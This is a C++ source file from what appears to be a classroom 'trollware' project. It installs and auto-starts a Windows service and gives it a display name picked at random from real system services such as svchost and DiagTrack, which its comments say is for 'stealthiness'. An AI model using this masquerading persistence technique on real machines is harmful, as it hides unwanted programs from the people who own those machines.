#include <windows.h>
#include <iostream>
#include <filesystem>
#include <vector>


/*
    This file contains all code necessary to register and start and stop and delete services
*/


std::vector<std::string> Sample_Service_Names = {"Audiosrv", "BluetoothUserService", "COMSysApp", "svchost",
"DiagTrack", "Hyper-V Data Exchange Service", "Microsoft (R) Diagnostics Hub Standard Collector Service",
"Windows License Manager Service", "Xbox Accessory Management Service"};



int register_service(std::string service_path, std::string Service_Name)
{
    /*
        Responsible to install a service, Executable must be run with administrator privileges
        Service path is the path to the executable with service functions (see laugh_service.cpp and you'll understand the boilerplate)
        Service name is just a name to be able to stop and delete the service, it should be easily traceable to be able to easily stop and delete the service
        otherwise reverting back to the machine's original state is gonna be hard
    */

    srand(time(0));
    int random_index = rand()%Sample_Service_Names.size();
    int result = -1;
    
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager)
    {
        SC_HANDLE hService = CreateServiceA(
            hSCManager,
            Service_Name.c_str(),   //TECH DEBT         // Service name, I will leave this name constant just to make it easier for me -Ayman- to kill this service if I ever wanted to
            Sample_Service_Names[random_index].c_str(),// Display name, made random to achieve slight stealthiness
            SERVICE_ALL_ACCESS,          // Access rights
            SERVICE_WIN32_OWN_PROCESS,   // Service type
            SERVICE_AUTO_START,          // Start type, I always choose it to be autostart
            SERVICE_ERROR_NORMAL,        // Error control type
            service_path.c_str(), // Path to the service executable
            NULL, NULL, NULL, NULL, NULL);
        int lasterror = GetLastError();


        if (hService)
        {
            std::cout << "Service installed successfully!" << std::endl;
            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to install service!" << std::endl;
            
            switch (lasterror){
                    case ERROR_ACCESS_DENIED:
                        std::cerr << "Failed to create service, ERROR_ACCESS_DENIED!" << std::endl; return lasterror;
                    case ERROR_CIRCULAR_DEPENDENCY:
                        std::cerr << "Failed to create service, ERROR_CIRCULAR_DEPENDENCY!" << std::endl; return lasterror;
                    case ERROR_DUPLICATE_SERVICE_NAME:
                        std::cerr << "Failed to create service, ERROR_DUPLICATE_SERVICE_NAME!, trying to start it..." << std::endl; // THE only case where I will continue execution
                    case ERROR_INVALID_HANDLE:
                        std::cerr << "Failed to create service, ERROR_INVALID_HANDLE!" << std::endl; return lasterror;
                    case ERROR_INVALID_NAME:
                        std::cerr << "Failed to create service, ERROR_INVALID_NAME!" << std::endl; return lasterror;
                    case ERROR_INVALID_PARAMETER:
                        std::cerr << "Failed to create service, ERROR_INVALID_PARAMETER!" << std::endl; return lasterror;
                    case ERROR_INVALID_SERVICE_ACCOUNT:
                        std::cerr << "Failed to create service, ERROR_INVALID_SERVICE_ACCOUNT!" << std::endl; return lasterror;
                    case ERROR_SERVICE_EXISTS:
                        std::cerr << "Failed to create service, ERROR_SERVICE_EXISTS!, trying to start it..." << std::endl; // THE only case where I will continue execution
                    case ERROR_SERVICE_MARKED_FOR_DELETE:
                        std::cerr << "Failed to create service, ERROR_SERVICE_MARKED_FOR_DELETE!" << std::endl; return lasterror;
                    default:
                        std::cerr << "Failed to create service, Unk ERROR!, ERROR_CODE: "<<lasterror << std::endl; return lasterror;
                }

            
            
        }
        CloseServiceHandle(hSCManager);

        
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }



    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager)
    {
        SC_HANDLE hService = OpenServiceA(hSCManager, Service_Name.c_str(), SERVICE_START);
        if (hService)
        {
            SC_HANDLE hService = OpenServiceA(hSCManager, Service_Name.c_str(), SERVICE_START);
        
            result = StartService(hService, 0, NULL);
            if (result) {std::cout << "Service started successfully!" << std::endl; CloseServiceHandle(hService); return 0;}
            else{
                int StartServiceResultProbe = GetLastError();
                std::cerr << "Failed to start service, ERROR CODE = "<<StartServiceResultProbe << std::endl;
                switch (StartServiceResultProbe){
                    case ERROR_ACCESS_DENIED:
                        std::cerr << "Failed to start service, ACCESS_DENIED!" << std::endl;
                    case ERROR_INVALID_HANDLE:
                        std::cerr << "Failed to start service, ERROR_INVALID_HANDLE!" << std::endl;
                    case ERROR_PATH_NOT_FOUND:
                        std::cerr << "Failed to start service, ERROR_PATH_NOT_FOUND!" << std::endl;
                    case ERROR_SERVICE_ALREADY_RUNNING:
                        std::cerr << "Failed to start service, ERROR_SERVICE_ALREADY_RUNNING!" << std::endl;
                    case ERROR_SERVICE_DATABASE_LOCKED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DATABASE_LOCKED!" << std::endl;
                    case ERROR_SERVICE_DEPENDENCY_DELETED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DEPENDENCY_DELETED!" << std::endl;
                    case ERROR_SERVICE_DEPENDENCY_FAIL:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DEPENDENCY_FAIL!" << std::endl;
                    case ERROR_SERVICE_DISABLED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_DISABLED!" << std::endl;
                    case ERROR_SERVICE_LOGON_FAILED:
                        std::cerr << "Failed to start service, ERROR_SERVICE_LOGON_FAILED!" << std::endl;
                    case ERROR_SERVICE_MARKED_FOR_DELETE:
                        std::cerr << "Failed to start service, ERROR_SERVICE_MARKED_FOR_DELETE!" << std::endl;
                    case ERROR_SERVICE_NO_THREAD:
                        std::cerr << "Failed to start service, ERROR_SERVICE_NO_THREAD!" << std::endl;
                    case ERROR_SERVICE_REQUEST_TIMEOUT:
                        std::cerr << "Failed to start service, ERROR_SERVICE_REQUEST_TIMEOUT!" << std::endl;
                    default:
                        std::cerr << "Failed to start service, Unk ERROR!, ERROR_CODE: "<<StartServiceResultProbe << std::endl;
                }
            }

            CloseServiceHandle(hService);
        }
        else
        {
            std::cerr << "Failed to open service!" << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::cerr << "Failed to open service manager!" << std::endl;
    }

    //CreateServiceA(hndl, "LaughService", "EidFar5a", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\laugh_service.exe", 0, 0, 0, 0, 0);
    //StartServiceA(hndl, 0, NULL);


    return result;

}



// int main()
// {
    
//     std::string LaughServicePath = "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\laugh_service.exe";
//     register_service_laugh_sound(LaughServicePath, "LaughService");


//     return 0;
// }